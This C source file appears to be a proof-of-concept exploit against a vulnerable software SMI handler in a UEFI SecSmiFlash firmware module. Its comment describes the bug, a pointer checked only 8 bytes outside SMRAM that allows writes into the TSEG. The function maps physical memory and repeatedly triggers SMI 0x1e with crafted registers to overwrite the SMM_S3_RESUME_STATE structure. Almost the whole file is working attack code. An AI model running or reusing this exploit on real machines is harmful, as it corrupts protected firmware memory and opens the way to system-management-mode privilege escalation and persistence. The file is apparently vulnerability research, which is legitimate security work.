
#include "poc_SecSMIFlash.h"
#include "pci.h"
#include "physmem.h"
#include "msr.h"
#include "global.h"
#include "Util.h"
#include <string.h>


void do_overwrite_smm_s3_state() {
    /*
    This triggers a vulnerable SW SMI in SecSmiFlash that allows to write 
    a value 1 into the first 252 bytes of the TSEG

    The primitive is:
        mov byte ptr [rcx+102h], 1

    RCX is a controlled pointer that was only verified to be outside of SMRAM by 8 bytes
    Meaning 102h - 8 = 252 bytes of possible corruption

    The Structure SMM_S3_RESUME_STATE lives in this area    
    */
    SW_SMI_CALL smi_call = {0};

    smi_call.SwSmiNumber = 0x1e;

    UINT64 tseg_base = 0xef000000;
    UINT64 target    = tseg_base - 259;

    void *mapped_va = map_physical_memory(tseg_base - PAGE_SIZE, PAGE_SIZE);

    memset((void *) mapped_va, 0x00, PAGE_SIZE);

    print_memory(0, (char * )mapped_va, PAGE_SIZE);

    for (int  i = 0 ; i < 250; i ++) {
        smi_call.rcx = (target >> 32) & 0xFFFFFFFF;
        smi_call.rbx = target  & 0xFFFFFFFF;

        
        printf("attempting to write 1 into %llx\n", target + 0x102);

        target += 1;

        trigger_smi(&smi_call);

    }

    print_memory(0, (char * )mapped_va, PAGE_SIZE);

    unmap_physical_memory(mapped_va, PAGE_SIZE);
}